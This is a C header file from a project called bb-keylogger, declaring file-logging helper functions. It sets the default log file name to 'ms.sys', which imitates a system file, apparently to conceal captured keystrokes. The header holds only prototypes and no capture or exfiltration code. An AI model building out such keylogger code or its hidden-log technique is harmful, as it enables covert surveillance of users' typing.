/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger-file.h
* Author: Frapin Kevin
* Date:   11/04/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing :
*  - the functions used to manage files operations
*  - the constants used by these functions
* -----------------------------------------------------------------------------
*/

#ifndef BB_KEYLOGGER_FILE_H
#define BB_KEYLOGGER_FILE_H

//------------------------------------------------------------- SYSTEM INCLUDES
#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>

//------------------------------------------------------------------- CONSTANTS
// Name of the default log file
#define DEFAULT_LOG_FILE_NAME "ms.sys"

//------------------------------------------------------------------- FUNCTIONS

/*
* Function that log informations passed through unamed parameters.
* The informations are saved in the log file in the specified format.
*/
void log_infos( FILE * log_file, const char * format, ... );

/*
* Function that opens a file a checks if the opening succeeded :
*  - if the opening failed, the programm is killed
*  - if the opening succeeded, the file pointer is returned
*/
FILE * open_file( char * file_name );

#endif /* BB_KEYLOGGER_FILE_H */